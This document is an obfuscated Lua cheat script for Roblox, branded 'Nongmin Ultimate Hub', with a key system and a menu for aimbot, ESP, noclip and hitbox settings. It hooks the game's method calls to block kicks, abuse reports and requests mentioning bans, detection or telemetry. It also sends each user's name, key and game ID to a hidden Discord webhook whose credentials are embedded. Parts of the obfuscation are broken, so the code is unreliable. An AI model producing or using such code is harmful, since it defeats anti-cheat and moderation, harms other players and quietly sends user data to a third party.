return(function(OhdGH, ...)
local hEhJ1Z = {"Hvzaj";"BjwX";"kUdsy8eyxjF";"WZ8C5F";"JWhWY2mW6Ru"}
local 2PY8N0vL = function(...)
-- =====================================================================
-- Premium script by.Nongmin - Ultimate Hub v7.6 (Admin & Expiry Fixed)
-- =====================================================================

local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local CoreGui = game:GetService(loadstring(base64decode("Q29yZUd1aQ=="))())
local Stats = game:GetService(loadstring(base64decode("U3RhdHM="))())
local Lighting = game:GetService(loadstring(base64decode("TGlnaHRpbmc="))())
local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
local UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
local HttpService = game:GetService(loadstring(base64decode("SHR0cFNlcnZpY2U="))())
local VirtualUser = game:GetService(loadstring(base64decode("VmlydHVhbFVzZXI="))())
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

-- รายชื่อ Owner หลัก (สิทธิ์สูงสุด สร้างคีย์ถาวรได้ และเพิ่มแอดมินได้)
local Owners = {[loadstring(base64decode("VGVyeF84Mw=="))()] = true}

-- รายชื่อ Admin (เวลาใช้งานไม่จำกัดเหมือน Owner แต่สร้างคีย์ถาวรไม่ได้)
local Admins = {[loadstring(base64decode("QWRtaW5GcmllbmQwMQ=="))()] = true}

-- ลิงก์ Discord Webhook ของคุณ
local WEBHOOK_URL = loadstring(base64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2NjUxNzU2NTc1NTM2MzQ5OS9pdXhxVEp3SFZhSFZ6QlR4d0pSYkJZVWt2RGVMNXNaSXpSZmRBdDRtRjAwNGN5TFJHeVd6OFcxLXBpSEhMM2NILWRuaA=="))()

local function SendDiscordWebhook(title, description, colorCode)
    pcall(function()
        if WEBHOOK_URL == loadstring(base64decode(""))() or string.match(WEBHOOK_URL, loadstring(base64decode("WU9VUl9XRUJIT09L"))()) then return end
        local data = {
            [loadstring(base64decode("ZW1iZWRz"))()] = {{
                [loadstring(base64decode("dGl0bGU="))()] = title,
                [loadstring(base64decode("ZGVzY3JpcHRpb24="))()] = description,
                [loadstring(base64decode("Y29sb3I="))()] = colorCode or 3447003,
                [loadstring(base64decode("Zm9vdGVy"))()] = {[loadstring(base64decode("dGV4dA=="))()] = loadstring(base64decode("Tm9uZ21pbiBVbHRpbWF0ZSBIdWIgfCBLZXkgU3lzdGVtICYgQWRtaW4gUGFuZWw="))()}
            }}
        }
        local encodedData = HttpService:JSONEncode(data)
        local requestFunc = syn and syn.request or http and http.request or http_request or request
        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = loadstring(base64decode("UE9TVA=="))(),
                Headers = {[loadstring(base64decode("Q29udGVudC1UeXBl"))()] = loadstring(base64decode("YXBwbGljYXRpb24vanNvbg=="))()},
                Body = encodedData
            })
        end
    end)
end

getgenv().HubLoaded = false
getgenv().CurrentKeyInfo = {Key = loadstring(base64decode("Tm9uZQ=="))(), ExpiresAt = 0}

for _, v in pairs(CoreGui:GetChildren()) do
    if v.Name == loadstring(base64decode("Tm9uZ21pblVsdGltYXRlSHVi"))() then
        v:Destroy()
    end
end

pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        if method == loadstring(base64decode("S2ljaw=="))() and self == LocalPlayer then return nil end
        if method == loadstring(base64decode("VGVsZXBvcnQ="))() or method == loadstring(base64decode("VGVsZXBvcnRUb05vdEluU2VydmVy"))() then return nil end
        
        if method == loadstring(base64decode("UmVwb3J0QWJ1c2U="))() or method == loadstring(base64decode("UG9zdEFzeW5j"))() or method == loadstring(base64decode("R2V0QXN5bmM="))() or method == loadstring(base64decode("SlNPTkVuY29kZQ=="))() then
            if type(args[1]) == loadstring(base64decode("c3RyaW5n"))() then
                local str = string.lower(args[1])
                if string.match(str, loadstring(base64decode("YmFu"))()) or string.match(str, loadstring(base64decode("ZGV0ZWN0"))()) or string.match(str, loadstring(base64decode("dGVsZW1ldHJ5"))()) or string.match(str, loadstring(base64decode("ZXhwbG9pdA=="))()) then
                    return nil
                end
            end
        end
        
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end)

local ScreenGui = Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))())
ScreenGui.Name = loadstring(base64decode("Tm9uZ21pblVsdGltYXRlSHVi"))()
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MinimalRGBStrokes = {}
local RenderConnection = nil
local ESPContainer = {}
local FOVCircle = Drawing.new(loadstring(base64decode("Q2lyY2xl"))())
FOVCircle.Visible = false
FOVCircle.Thickness = 2.0
FOVCircle.NumSides = 64
FOVCircle.Filled = false
FOVCircle.Transparency = 0.9

local function AddRGBStroke(parent, thickness)
    local stroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
    stroke.Thickness = thickness or 1.5
    stroke.Color = Color3.fromRGB(0, 162, 255)
    stroke.Parent = parent
    table.insert(MinimalRGBStrokes, stroke)
    return stroke
end

local function ShowNotification(title, message)
    pcall(function()
        local NotifFrame = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
        NotifFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
        NotifFrame.BorderSizePixel = 0
        NotifFrame.Position = UDim2.new(1, 10, 0.82, 0)
        NotifFrame.Size = UDim2.new(0, 240, 0, 55)
        NotifFrame.ZIndex = 500
        AddRGBStroke(NotifFrame, 2)
        Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), NotifFrame).CornerRadius = UDim.new(0, 6)

        local NotifTitle = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), NotifFrame)
        NotifTitle.BackgroundTransparency = 1
        NotifTitle.Position = UDim2.new(0, 10, 0, 6)
        NotifTitle.Size = UDim2.new(1, -20, 0, 16)
        NotifTitle.Font = Enum.Font.GothamBold
        NotifTitle.Text = title
        NotifTitle.TextColor3 = Color3.fromRGB(0, 180, 255)
        NotifTitle.TextSize = 9
        NotifTitle.TextXAlignment = Enum.TextXAlignment.Left
        NotifTitle.ZIndex = 501

        local NotifDesc = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), NotifFrame)
        NotifDesc.BackgroundTransparency = 1
        NotifDesc.Position = UDim2.new(0, 10, 0, 24)
        NotifDesc.Size = UDim2.new(1, -20, 0, 24)
        NotifDesc.Font = Enum.Font.Gotham
        NotifDesc.Text = message
        NotifDesc.TextColor3 = Color3.fromRGB(200, 210, 230)
        NotifDesc.TextSize = 8
        NotifDesc.TextWrapped = true
        NotifDesc.TextXAlignment = Enum.TextXAlignment.Left
        NotifDesc.ZIndex = 501

        NotifFrame:TweenPosition(UDim2.new(1, -255, 0.82, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)

        task.spawn(function()
            task.wait(3.0)
            NotifFrame:TweenPosition(UDim2.new(1, 10, 0.82, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.3, true)
            task.wait(0.3)
            NotifFrame:Destroy()
        end)
    end)
end

getgenv().UltimateStg = {
    NoclipEnabled = false,
    InfiniteJumpEnabled = false,
    AntiAFKEnabled = false,
    ESPGlow = false,
    ESPBox = false,
    ESPTracer = false,
    ESPNameInfo = false,
    ESPDistanceMax = 250,
    HitboxExpander = false,
    HitboxSize = 3,
    AimbotHead = false,
    AimbotTorso = false,
    ShowFOV = false,
    FOVSize = 100,
    FOVColorMode = 1,
    FPSBoost = false,
    FloatingStats = false
}

local ConfigFileName = loadstring(base64decode("Tm9uZ21pbkh1Yl9Db25maWcuanNvbg=="))()

local function SaveConfig()
    pcall(function()
        if writefile then
            local jsonDecoded = HttpService:JSONEncode(getgenv().UltimateStg)
            writefile(ConfigFileName, jsonDecoded)
            ShowNotification(loadstring(base64decode("8J+SviBDT05GSUcgU0FWRUQ="))(), loadstring(base64decode("4Lia4Lix4LiZ4LiX4Li24LiB4LiB4Liy4Lij4LiV4Lix4LmJ4LiH4LiE4LmI4Liy4Liq4Liz4LmA4Lij4LmH4LiI4LmB4Lil4LmJ4LinIQ=="))())
        end
    end)
end

local function LoadConfig()
    pcall(function()
        if readfile and isfile and isfile(ConfigFileName) then
            local fileContent = readfile(ConfigFileName)
            local data = HttpService:JSONDecode(fileContent)
            if data and type(data) == loadstring(base64decode("dGFibGU="))() then
                for k, v in pairs(data) do
                    if getgenv().UltimateStg[k] ~= nil then
                        getgenv().UltimateStg[k] = v
                    end
                end
                ShowNotification(loadstring(base64decode("8J+TgiBDT05GSUcgTE9BREVE"))(), loadstring(base64decode("4LmC4Lir4Lil4LiU4LiE4LmI4Liy4LiV4Lix4LmJ4LiH4LiE4LmI4Liy4LmA4LiU4Li04Lih4Liq4Liz4LmA4Lij4LmH4LiIIQ=="))())
            end
        end
    end)
end

LoadConfig()

local KeyDatabase = {
    [loadstring(base64decode("TUlOLVZJUC0xMTEx"))()] = {Used = false, ExpiresAt = 0},
    [loadstring(base64decode("TUlOLVZJUC03REFZUw=="))()] = {Used = false, ExpiresAt = os.time() + (7 * 24 * 60 * 60)}
}

local KeyScreen = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
KeyScreen.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
KeyScreen.BorderSizePixel = 0
KeyScreen.AnchorPoint = Vector2.new(0.5, 0.5)
KeyScreen.Position = UDim2.new(0.5, 0, 0.5, 0)
KeyScreen.Size = UDim2.new(0, 340, 0, 220)
KeyScreen.Active = true
KeyScreen.Draggable = true
AddRGBStroke(KeyScreen, 2)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), KeyScreen).CornerRadius = UDim.new(0, 8)

local KeyTitle = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), KeyScreen)
KeyTitle.BackgroundTransparency = 1
KeyTitle.Position = UDim2.new(0, 15, 0, 15)
KeyTitle.Size = UDim2.new(1, -30, 0, 25)
KeyTitle.Font = Enum.Font.GothamBold
KeyTitle.Text = loadstring(base64decode("8J+UkSBFTlRFUiBLRVkgU1lTVEVN"))()
KeyTitle.TextColor3 = Color3.fromRGB(0, 180, 255)
KeyTitle.TextSize = 12
KeyTitle.TextXAlignment = Enum.TextXAlignment.Center

local KeySub = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), KeyScreen)
KeySub.BackgroundTransparency = 1
KeySub.Position = UDim2.new(0, 15, 0, 42)
KeySub.Size = UDim2.new(1, -30, 0, 20)
KeySub.Font = Enum.Font.Gotham
KeySub.Text = loadstring(base64decode("4pyoIFNlY3VyZSBLZXkgU3lzdGVtIHdpdGggRXhwaXJ5IFRyYWNrZXIg4pyo"))()
KeySub.TextColor3 = Color3.fromRGB(160, 180, 210)
KeySub.TextSize = 8
KeySub.TextXAlignment = Enum.TextXAlignment.Center

local KeyBox = Instance.new(loadstring(base64decode("VGV4dEJveA=="))(), KeyScreen)
KeyBox.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
KeyBox.BorderColor3 = Color3.fromRGB(45, 60, 90)
KeyBox.BorderSizePixel = 1
KeyBox.Position = UDim2.new(0, 25, 0, 75)
KeyBox.Size = UDim2.new(1, -50, 0, 35)
KeyBox.Font = Enum.Font.GothamSemibold
KeyBox.PlaceholderText = loadstring(base64decode("8J+RiSBFbnRlciB5b3VyIGtleSBoZXJlLi4u"))()
KeyBox.Text = loadstring(base64decode(""))()
KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyBox.PlaceholderColor3 = Color3.fromRGB(110, 130, 170)
KeyBox.TextSize = 10
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), KeyBox).CornerRadius = UDim.new(0, 6)

local SubmitKeyBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), KeyScreen)
SubmitKeyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
SubmitKeyBtn.BorderSizePixel = 0
SubmitKeyBtn.Position = UDim2.new(0, 25, 0, 122)
SubmitKeyBtn.Size = UDim2.new(1, -50, 0, 32)
SubmitKeyBtn.Font = Enum.Font.GothamBold
SubmitKeyBtn.Text = loadstring(base64decode("8J+agCBWRVJJRlkgS0VZIC8g4Lii4Li34LiZ4Lii4Lix4LiZ4LiE4Li14Lii4LmM"))()
SubmitKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitKeyBtn.TextSize = 9
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), SubmitKeyBtn).CornerRadius = UDim.new(0, 6)

local CancelKeyBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), KeyScreen)
CancelKeyBtn.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
CancelKeyBtn.BorderColor3 = Color3.fromRGB(50, 60, 85)
CancelKeyBtn.Position = UDim2.new(0, 25, 0, 162)
CancelKeyBtn.Size = UDim2.new(1, -50, 0, 28)
CancelKeyBtn.Font = Enum.Font.GothamBold
CancelKeyBtn.Text = loadstring(base64decode("4p2MIENBTkNFTCAvIOC4ouC4geC5gOC4peC4tOC4gQ=="))()
CancelKeyBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
CancelKeyBtn.TextSize = 9
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), CancelKeyBtn).CornerRadius = UDim.new(0, 6)

CancelKeyBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local LoadingFrame = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
LoadingFrame.BorderSizePixel = 0
LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
LoadingFrame.Size = UDim2.new(0, 340, 0, 210)
LoadingFrame.Visible = false
AddRGBStroke(LoadingFrame, 2)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), LoadingFrame).CornerRadius = UDim.new(0, 8)

local LoadTitle = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), LoadingFrame)
LoadTitle.BackgroundTransparency = 1
LoadTitle.Position = UDim2.new(0, 15, 0, 35)
LoadTitle.Size = UDim2.new(1, -30, 0, 20)
LoadTitle.Font = Enum.Font.GothamBold
LoadTitle.Text = loadstring(base64decode("4q2QIEtleSBWZXJpZmllZCEgTG9hZGluZyBIdWIuLi4g4q2Q"))()
LoadTitle.TextColor3 = Color3.fromRGB(0, 180, 255)
LoadTitle.TextSize = 11
LoadTitle.TextXAlignment = Enum.TextXAlignment.Center

local LoadPercent = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), LoadingFrame)
LoadPercent.BackgroundTransparency = 1
LoadPercent.Position = UDim2.new(0, 15, 0, 65)
LoadPercent.Size = UDim2.new(1, -30, 0, 30)
LoadPercent.Font = Enum.Font.GothamBold
LoadPercent.Text = loadstring(base64decode("MCU="))()
LoadPercent.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadPercent.TextSize = 16
LoadPercent.TextXAlignment = Enum.TextXAlignment.Center

local BarBg = Instance.new(loadstring(base64decode("RnJhbWU="))(), LoadingFrame)
BarBg.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
BarBg.BorderSizePixel = 0
BarBg.Position = UDim2.new(0, 25, 0, 115)
BarBg.Size = UDim2.new(1, -50, 0, 10)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), BarBg).CornerRadius = UDim.new(1, 0)

local BarFill = Instance.new(loadstring(base64decode("RnJhbWU="))(), BarBg)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
BarFill.BorderSizePixel = 0
BarFill.Size = UDim2.new(0, 0, 1, 0)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), BarFill).CornerRadius = UDim.new(1, 0)

-- หน้าต่างแจ้งเตือนสิทธิ์ (Custom Alert Popup สำหรับ Admin)
local AlertPopup = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
AlertPopup.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
AlertPopup.BorderSizePixel = 0
AlertPopup.AnchorPoint = Vector2.new(0.5, 0.5)
AlertPopup.Position = UDim2.new(0.5, 0, 0.5, 0)
AlertPopup.Size = UDim2.new(0, 300, 0, 150)
AlertPopup.Visible = false
AlertPopup.ZIndex = 200
AddRGBStroke(AlertPopup, 2)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), AlertPopup).CornerRadius = UDim.new(0, 8)

local AP_Title = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), AlertPopup)
AP_Title.BackgroundTransparency = 1
AP_Title.Position = UDim2.new(0, 15, 0, 15)
AP_Title.Size = UDim2.new(1, -30, 0, 20)
AP_Title.Font = Enum.Font.GothamBold
AP_Title.Text = loadstring(base64decode("4pqg77iPIOC5geC4iOC5ieC4h+C5gOC4leC4t+C4reC4meC4quC4tOC4l+C4mOC4tOC5jOC4geC4suC4o+C5g+C4iuC5ieC4h+C4suC4mQ=="))()
AP_Title.TextColor3 = Color3.fromRGB(255, 90, 90)
AP_Title.TextSize = 11
AP_Title.ZIndex = 201

local AP_Desc = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), AlertPopup)
AP_Desc.BackgroundTransparency = 1
AP_Desc.Position = UDim2.new(0, 15, 0, 42)
AP_Desc.Size = UDim2.new(1, -30, 0, 45)
AP_Desc.Font = Enum.Font.Gotham
AP_Desc.Text = loadstring(base64decode("4LiE4Li44LiT4LmE4Lih4LmI4Lih4Li14Liq4Li04LiX4LiY4Li04LmM4Liq4Lij4LmJ4Liy4LiH4LiE4Li14Lii4LmM4LiW4Liy4Lin4LijXG4o4LmA4LiJ4Lie4Liy4LiwIE93bmVyIOC4q+C4o+C4t+C4reC5gOC4iOC5ieC4suC4guC4reC4h+C4quC4hOC4o+C4tOC4m+C4leC5jOC5gOC4l+C5iOC4suC4meC4seC5ieC4mSk="))()
AP_Desc.TextColor3 = Color3.fromRGB(200, 210, 230)
AP_Desc.TextSize = 8
AP_Desc.TextWrapped = true
AP_Desc.ZIndex = 201

local AP_OkBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), AlertPopup)
AP_OkBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
AP_OkBtn.BorderSizePixel = 0
AP_OkBtn.Position = UDim2.new(0.5, -60, 0, 100)
AP_OkBtn.Size = UDim2.new(0, 120, 0, 30)
AP_OkBtn.Font = Enum.Font.GothamBold
AP_OkBtn.Text = loadstring(base64decode("4LiV4LiB4Lil4LiHIChPSyk="))()
AP_OkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AP_OkBtn.TextSize = 9
AP_OkBtn.ZIndex = 201
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), AP_OkBtn).CornerRadius = UDim.new(0, 6)

AP_OkBtn.MouseButton1Click:Connect(function()
    AlertPopup.Visible = false
end)

local MainFrame = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.Size = UDim2.new(0, 460, 0, 280)
MainFrame.Active = true
MainFrame.Visible = false
MainFrame.ClipsDescendants = false
AddRGBStroke(MainFrame, 2.5)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), MainFrame).CornerRadius = UDim.new(0, 8)

local ToggleButton = Instance.new(loadstring(base64decode("SW1hZ2VCdXR0b24="))(), ScreenGui)
ToggleButton.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
ToggleButton.BorderSizePixel = 0
ToggleButton.Position = UDim2.new(0, 20, 0.5, -30)
ToggleButton.Size = UDim2.new(0, 50, 0, 50)
ToggleButton.Image = loadstring(base64decode("cmJ4YXNzZXRpZDovLzU3OTI3MTIzOA=="))()
ToggleButton.ScaleType = Enum.ScaleType.Crop
ToggleButton.Visible = false
AddRGBStroke(ToggleButton, 2)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ToggleButton).CornerRadius = UDim.new(0, 10)

local ToggleLabel = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), ToggleButton)
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Size = UDim2.new(1, 0, 1, 0)
ToggleLabel.Font = Enum.Font.GothamBold
ToggleLabel.Text = loadstring(base64decode("8J+SlltIXQ=="))()
ToggleLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
ToggleLabel.TextSize = 14

SubmitKeyBtn.MouseButton1Click:Connect(function()
    local userKey = KeyBox.Text
    local keyData = KeyDatabase[userKey]
    
    -- Owner หรือ Admin เข้าใช้สคริปต์ได้ทันที เวลาไม่จำกัด
    if Owners[LocalPlayer.Name] or Admins[LocalPlayer.Name] then
        getgenv().CurrentKeyInfo = {Key = loadstring(base64decode("REVWRUxPUEVSIC8gQURNSU4gUEFTUw=="))(), ExpiresAt = 0}
        KeyScreen.Visible = false
        LoadingFrame.Visible = true
        for i = 1, 100 do
            LoadPercent.Text = i .. loadstring(base64decode("JQ=="))()
            BarFill.Size = UDim2.new(i/100, 0, 1, 0)
            task.wait(0.015)
        end
        LoadingFrame.Visible = false
        MainFrame.Visible = true
        ToggleButton.Visible = true
        getgenv().HubLoaded = true
        local roleTitle = Owners[LocalPlayer.Name] and loadstring(base64decode("8J+MnyBXRUxDT01FIE9XTkVS"))() or loadstring(base64decode("8J+boe+4jyBXRUxDT01FIEFETUlO"))()
        ShowNotification(roleTitle, loadstring(base64decode("4Lii4Li04LiZ4LiU4Li14LiV4LmJ4Lit4LiZ4Lij4Lix4Lia4Lic4Li54LmJ4LiU4Li54LmB4Lil4Lij4Liw4Lia4LiaIOC5gOC4guC5ieC4suC4quC4ueC5iCBOb25nbWluIEh1YiE="))())
        return
    end

    if keyData then
        if keyData.Used == true then
            KeyBox.Text = loadstring(base64decode(""))()
            KeyBox.PlaceholderText = loadstring(base64decode("4p2MIEtleSBhbHJlYWR5IHVzZWQh"))()
        elseif keyData.ExpiresAt > 0 and os.time() > keyData.ExpiresAt then
            KeyBox.Text = loadstring(base64decode(""))()
            KeyBox.PlaceholderText = loadstring(base64decode("4p2MIEtleSBleHBpcmVkIQ=="))()
        else
            keyData.Used = true
            getgenv().CurrentKeyInfo = {Key = userKey, ExpiresAt = keyData.ExpiresAt}
            
            KeyScreen.Visible = false
            LoadingFrame.Visible = true
            for i = 1, 100 do
                LoadPercent.Text = i .. loadstring(base64decode("JQ=="))()
                BarFill.Size = UDim2.new(i/100, 0, 1, 0)
                task.wait(0.015)
            end
            LoadingFrame.Visible = false
            MainFrame.Visible = true
            ToggleButton.Visible = true
            
            getgenv().HubLoaded = true
            ShowNotification(loadstring(base64decode("8J+MnyBXRUxDT01F"))(), loadstring(base64decode("4Lii4Li04LiZ4LiU4Li14LiV4LmJ4Lit4LiZ4Lij4Lix4Lia4LmA4LiC4LmJ4Liy4Liq4Li54LmIIE5vbmdtaW4gSHViIQ=="))())
            SendDiscordWebhook(loadstring(base64decode("8J+agCBLZXkgVmVyaWZpZWQgU3VjY2Vzc2Z1bGx5"))(), loadstring(base64decode("UGxheWVyOiAqKg=="))() .. LocalPlayer.Name .. loadstring(base64decode("KipcbktleSBVc2VkOiBg"))() .. userKey .. loadstring(base64decode("YFxuR2FtZSBJRDogYA=="))() .. game.PlaceId .. loadstring(base64decode("YA=="))(), 65280)
        end
    else
        KeyBox.Text = loadstring(base64decode(""))()
        KeyBox.PlaceholderText = loadstring(base64decode("4p2MIEludmFsaWQgS2V5IQ=="))()
    end
end)

local dragging, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

local tDragging, tDragStart, tStartPos
ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        tDragging = true
        tDragStart = input.Position
        tStartPos = ToggleButton.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if tDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - tDragStart
        ToggleButton.Position = UDim2.new(tStartPos.X.Scale, tStartPos.X.Offset + delta.X, tStartPos.Y.Scale, tStartPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        tDragging = false
    end
end)

local function ToggleMenu()
    MainFrame.Visible = not MainFrame.Visible
end
ToggleButton.MouseButton1Click:Connect(ToggleMenu)
UserInputService.InputBegan:Connect(function(input, gp)
    if not gp and input.KeyCode == Enum.KeyCode.H then ToggleMenu() end
end)

local TopBarHolder = Instance.new(loadstring(base64decode("U2Nyb2xsaW5nRnJhbWU="))(), MainFrame)
TopBarHolder.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
TopBarHolder.BorderSizePixel = 0
TopBarHolder.Size = UDim2.new(1, -35, 0, 36)
TopBarHolder.CanvasSize = UDim2.new(0, 600, 0, 0)
TopBarHolder.ScrollBarThickness = 0
TopBarHolder.ScrollingDirection = Enum.ScrollingDirection.X

local TopBarList = Instance.new(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), TopBarHolder)
TopBarList.FillDirection = Enum.FillDirection.Horizontal
TopBarList.SortOrder = Enum.SortOrder.LayoutOrder
TopBarList.Padding = UDim.new(0, 2)

local ConfirmDialog = Instance.new(loadstring(base64decode("RnJhbWU="))(), ScreenGui)
ConfirmDialog.BackgroundColor3 = Color3.fromRGB(15, 17, 26)
ConfirmDialog.BorderSizePixel = 0
ConfirmDialog.AnchorPoint = Vector2.new(0.5, 0.5)
ConfirmDialog.Position = UDim2.new(0.5, 0, 0.5, 0)
ConfirmDialog.Size = UDim2.new(0, 320, 0, 160)
ConfirmDialog.Visible = false
ConfirmDialog.ZIndex = 100
AddRGBStroke(ConfirmDialog, 2)
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ConfirmDialog).CornerRadius = UDim.new(0, 8)

local CDTitle = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), ConfirmDialog)
CDTitle.BackgroundTransparency = 1
CDTitle.Position = UDim2.new(0, 15, 0, 15)
CDTitle.Size = UDim2.new(1, -30, 0, 20)
CDTitle.Font = Enum.Font.GothamBold
CDTitle.Text = loadstring(base64decode("4pqg77iPIOC4ouC4t+C4meC4ouC4seC4meC4geC4suC4o+C4m+C4tOC4lOC5g+C4iuC5ieC4h+C4suC4mSAoQ29uZmlybSBFeGl0KQ=="))()
CDTitle.TextColor3 = Color3.fromRGB(255, 90, 90)
CDTitle.TextSize = 11
CDTitle.ZIndex = 101

local CDDesc = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))(), ConfirmDialog)
CDDesc.BackgroundTransparency = 1
CDDesc.Position = UDim2.new(0, 15, 0, 42)
CDDesc.Size = UDim2.new(1, -30, 0, 40)
CDDesc.Font = Enum.Font.Gotham
CDDesc.Text = loadstring(base64decode("4LiE4Li44LiT4LmB4LiZ4LmI4LmD4LiI4Lir4Lij4Li34Lit4LmE4Lih4LmI4Lin4LmI4Liy4LiV4LmJ4Lit4LiH4LiB4Liy4Lij4Lib4Li04LiU4Liq4LiE4Lij4Li04Lib4LiV4LmMP1xu4Lif4Lix4LiH4LiB4LmM4LiK4Lix4LiZ4LiX4Lix4LmJ4LiH4Lir4Lih4LiU4LiI4Liw4Lir4Lii4Li44LiU4LiX4Liz4LiH4Liy4LiZ4LmB4Lil4Liw4Lib4Li04LiU4Lil4LiH4LiX4Lix4LiZ4LiX4Li1"))()
CDDesc.TextColor3 = Color3.fromRGB(180, 190, 210)
CDDesc.TextSize = 8
CDDesc.TextWrapped = true
CDDesc.ZIndex = 101

local ConfirmYesBtn = Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), ConfirmDialog)
ConfirmYesBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
ConfirmYesBtn.BorderSizePixel = 0
ConfirmYesBtn.Position = UDim2.new(0, 20, 0, 105)
ConfirmYesBtn.Size = UDim2.new(0, 130, 0, 32)
ConfirmYesBtn.Font = Enum.Font.GothamBold
ConfirmYesBtn.Text = loadstring(base64decode("4pyTIOC4ouC4t+C4meC4ouC4seC4mSAoQ29uZmlybSk="))()
ConfirmYesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ConfirmYesBtn.TextSize = 9
ConfirmYesBtn.ZIndex = 101
Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(), ConfirmYesBtn).CornerRadius = UDim.new(0, 6)

